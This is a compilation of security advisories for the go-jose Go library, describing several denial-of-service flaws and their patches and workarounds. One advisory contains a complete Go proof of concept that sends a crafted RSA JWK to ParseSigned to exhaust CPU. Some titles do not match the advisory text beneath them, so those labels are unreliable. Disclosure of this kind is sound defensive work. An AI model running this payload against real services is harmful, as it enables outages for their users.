summary: Unprotected JWE headers can override empty or null protected values
Panic on JWT claim matching an embedded unexported field
description:
### Summary

The go-jose json fork of json panics when decoding a JWT claim that names a field promoted from an embedded unexported type: either a nil pointer to an unexported struct or an unexported non-struct type.

### Details

We port Go 1.10's encoding/json behavior: decoding returns an error when it cannot allocate a nil embedded pointer to an unexported struct, and embedded unexported non-struct types are ignored. Embedded unexported structs keep working as before.

### Impact

Denial of service. An application is affected only if it decodes untrusted JSON with go-jose's json package (for example through `jwt.Claims` or `UnsafeClaimsWithoutVerification`) into its own struct type that embeds either a pointer to an unexported struct type or an unexported non-struct type.

### Acknowledgements

Found via [oss-scanner](https://red.anthropic.com/oss-scanner/).

summary: Panic during RSA JWK thumbprint processing
description:
### Summary

`(*JSONWebKey).Thumbprint` panics with a nil pointer dereference when called on an RSA key whose exponent (`e`) is 0. Unmarshaling a JWK accepts such a key without error.

### Details

`Thumbprint` does not validate RSA key parameters before encoding them. When the exponent is 0, its encoded form is empty, which leads to a nil pointer dereference in `rsaThumbprintInput`.

go-jose itself is not affected in its JWS parsing: `ParseSigned`, `ParseSignedCompact`, and `ParseSignedJSON` reject an embedded `jwk` header that fails `Valid()` ([jws.go#L304-L308](https://github.com/go-jose/go-jose/blob/v4.1.6/jws.go#L304-L308), [jws.go#L357-L361](https://github.com/go-jose/go-jose/blob/v4.1.6/jws.go#L357-L361)). However, unmarshaling a `JSONWebKey` or `JSONWebKeySet` directly (for example with `json.Unmarshal`) does not validate the key, so application code that calls `Thumbprint` on such a key without first checking `Valid()` can panic.

### Impact

Denial of service vulnerability. Applications are affected if they call `Thumbprint` on an RSA key with exponent 0 that came from an untrusted source and was not checked with `Valid()`.


### Acknowledgements

Found via [oss-scanner](https://red.anthropic.com/oss-scanner/).

Denial of service when verifying certificates

description:
### Summary

Decrypting a ciphertext with "A128CBC-HS256", "A192CBC-HS384", or "A256CBC-HS512" can result in a panic on untrusted input.

Note this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

### Details

Insufficient validation of parameters can lead to attempting to index into an empty buffer. See https://github.com/go-jose/go-jose/pull/292.

### Workarounds

If the application does not require the CBC-HMAC modes for content encryption, and is using github.com/go-jose/go-jose/v4, do not include them in the list of ContentEncryption algorithms passed to ParseEncrypted / ParseEncryptedJSON / ParseEncryptedCompact.

### Impact

Denial of service vulnerability. Any application which decrypts untrusted ciphertexts with the indicated algorithms is affected.

### Acknowledgements

Thanks to Joshua Rogers of AISLE Research for reporting this problem.

### Summary

Parsing deeply nested JSON structures can hit Go's stack limit, causing the application to crash.

Note: this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

### Impact

Denial of service vulnerability. Any application that parses untrusted JSON via go-jose is exposed.

### Workarounds

Reject large inputs before parsing them.

### Acknowledgements

Thanks to Dohyun Kim (@azza999), Joshua Rogers of AISLE Research, and Sueun Cho for alerting us to the need to patch this.

summary: Denial of service when parsing JWKs that contain RSA keys
description:
### Summary

A crafted RSA key inside a JWK can cause operations that parse JWKs to consume excess CPU.

### Details

go-jose does not check for bounds on RSA modulus and primes before validating them. Values are passed directly to `crypto/rsa.PrivateKey.Validate()`. On Go 1.24+, this takes cubic time complexity with respect to the RSA modulus and primes. This allows an attacker to supply a crafted JWK to consume excessive CPU.

https://github.com/go-jose/go-jose/blob/5b371aecfcf7aabe06068d67da4344591ecddc76/jwk.go#L655-L700

### Proof of concept

No special configuration of go-jose is required to reproduce this vulnerability.

```go
package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"time"

	"github.com/go-jose/go-jose/v4"
)

func main() {
	// The RSA parameters can be complete junk. The CPU cost is in validating them.
	primeBits := 16384
	p := new(big.Int).Lsh(big.NewInt(1), uint(primeBits-1))
	p.SetBit(p, 0, 1)
	n := new(big.Int).Lsh(big.NewInt(1), 2048)
	e := big.NewInt(65537)
	d := big.NewInt(3)
	q := big.NewInt(3)

	jwk := map[string]string{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(n.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(e.Bytes()),
		"d":   base64.RawURLEncoding.EncodeToString(d.Bytes()),
		"p":   base64.RawURLEncoding.EncodeToString(p.Bytes()),
		"q":   base64.RawURLEncoding.EncodeToString(q.Bytes()),
	}

	protected := map[string]any{
		"alg": "RS256",
		"jwk": jwk,
	}
	protJSON, _ := json.Marshal(protected)

	jws := map[string]string{
		"protected": base64.RawURLEncoding.EncodeToString(protJSON),
		"payload":   base64.RawURLEncoding.EncodeToString([]byte(`{}`)),
		"signature": base64.RawURLEncoding.EncodeToString([]byte("not-a-real-signature")),
	}
	jwsJSON, _ := json.Marshal(jws)

	start := time.Now()
	_, err := jose.ParseSigned(string(jwsJSON), []jose.SignatureAlgorithm{jose.RS256})
	elapsed := time.Since(start)

	fmt.Printf("prime bits: %d\n", primeBits)
	fmt.Printf("parse time: %s\n", elapsed)
	fmt.Printf("parse error: %v\n", err)
}
```

### Impact

Denial of service vulnerability. Any application that uses go-jose to parse JWKs from untrusted sources is affected and should patch immediately.

### Credits

Reported by Yuval Saggie and Mor Weinberger (powered by Echo Frontier)

summary: Panics in JSON parsing and CBC-HMAC processing
description:
### Impact

 - Parsing deeply nested JSON structures can hit Go's stack limit, causing a panic.
 - Decrypting a ciphertext with "A128CBC-HS256", "A192CBC-HS384", or "A256CBC_HS512" can result in a panic on untrusted input.

### Patches

Patched in v4.1.5.

### Workarounds

 - Reject large inputs before parsing them.
 - If the application does not require the CBC-HMAC modes for content encryption, do not include them in the list of ContentEncryption algorithms passed to ParseEncrypted / ParseEncryptedJSON / ParseEncryptedCompact.

### References

https://github.com/go-jose/go-jose/releases/tag/v4.1.5

### Impact

Decrypting a JSON Web Encryption (JWE) object will panic if the `alg` field indicates a key wrapping algorithm ([one ending in `KW`](https://pkg.go.dev/github.com/go-jose/go-jose/v4#pkg-constants), with the exception of `A128GCMKW`, `A192GCMKW`, and `A256GCMKW`) and the `encrypted_key` field is empty. The panic happens when `cipher.KeyUnwrap()` in `key_wrap.go` attempts to allocate a slice with a zero or negative length based on the length of the `encrypted_key`.

This code path is reachable from `ParseEncrypted()` / `ParseEncryptedJSON()` / `ParseEncryptedCompact()` followed by `Decrypt()` on the resulting object. Note that the parse functions take a list of accepted key algorithms. If the accepted key algorithms do not include any key wrapping algorithms, parsing will fail and the application will be unaffected.

This panic is also reachable by calling `cipher.KeyUnwrap()` directly with any `ciphertext` parameter less than 16 bytes long, but calling this function directly is less common.

Panics can lead to denial of service.

### Fixed In

4.1.4 and v3.0.5

### Workarounds

If the list of `keyAlgorithms` passed to `ParseEncrypted()` / `ParseEncryptedJSON()` / `ParseEncryptedCompact()` does not include key wrapping algorithms (those ending in `KW`), your application is unaffected.

If your application uses key wrapping, you can prevalidate to the JWE objects to ensure the `encrypted_key` field is nonempty. If your application accepts JWE Compact Serialization, apply that validation to the corresponding field of that serialization (the data between the first and second `.`).

### Thanks

Thanks to Datadog's Security team for finding this issue.

### Impact
When parsing compact JWS or JWE input, go-jose could use excessive memory. The code used strings.Split(token, ".") to split JWT tokens, which is vulnerable to excessive memory consumption when processing maliciously crafted tokens with a large number of '.' characters.  An attacker could exploit this by sending numerous malformed tokens, leading to memory exhaustion and a Denial of Service.

### Patches
Version 4.0.5 fixes this issue

### Workarounds
Applications could pre-validate payloads passed to go-jose do not contain an excessive number of '.' characters.

### References
This is the same sort of issue as in the golang.org/x/oauth2/jws package as CVE-2025-22868 and Go issue https://go.dev/issue/71490.

summary: Improper Handling of Highly Compressed Data (Data Amplification) in github.com/go-jose/go-jose/v4
description:
### Impact
An attacker could send a JWE containing compressed data that used large amounts of memory and CPU when decompressed by Decrypt or DecryptMulti. Those functions now return an error if the decompressed data would exceed 250kB or 10x the compressed size (whichever is larger). Thanks to Enze Wang@Alioth and Jianjun Chen@Zhongguancun Lab (@zer0yu and @chenjj) for reporting.

### Patches
The problem is fixed in v4.0.1, v3.0.3, v2.6.3
